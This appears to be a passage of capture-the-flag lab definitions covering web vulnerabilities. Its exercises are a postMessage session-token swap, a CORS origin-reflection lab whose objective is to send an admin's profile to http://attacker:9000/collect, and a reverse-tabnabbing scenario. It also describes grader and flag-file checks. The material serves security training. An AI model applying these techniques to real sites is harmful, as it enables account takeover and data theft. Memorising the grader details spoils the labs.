labs.objective: From http://attacker:9000, open the widget in a popup or iframe and postMessage a command that swaps the admin bot's session token for an attacker-controlled one, then use that token to read /api/admin/flag.
labs.flag_hint: GET /api/admin/flag returns the flag when called with the attacker-supplied token AND the widget backend has recorded a token swap for the admin session. Also mirrored to /flag.txt.
labs.inspired_by: Classic Mozilla MDN cautionary example; distilled to a support-widget scenario.

labs.title: Mirror, Mirror on the Header
labs.description: PocketVault has an API endpoint /api/me that reads request Origin, echoes it verbatim into Access-Control-Allow-Origin, and sets Access-Control-Allow-Credentials: true. There is no origin allowlist.
labs.objective: Host a page on http://attacker:9000 that fetches https://vault.local/api/me with credentials:'include', extracts the admin bot's profile JSON (which contains the flag field), and POSTs it back to http://attacker:9000/collect.
labs.flag_hint: The bot logs into PocketVault and browses the attacker page; the /collect endpoint on the attacker container writes received bodies to /flag.txt. Grader checks /flag.txt contains the string starting FLAG{.
skills_taught: why '*' cannot be combined with credentials
labs.inspired_by: James Kettles 2016 CORS Exploitation Cheat Sheet; still the archetype for 2024 bug bounty reports.

labs.title: The Tab That Turned
labs.description: DevMart's product reviews render user-supplied 'external homepage' URLs as <a href=... target=_blank> without rel="noopener noreferrer". The support admin bot opens a suspicious review daily.
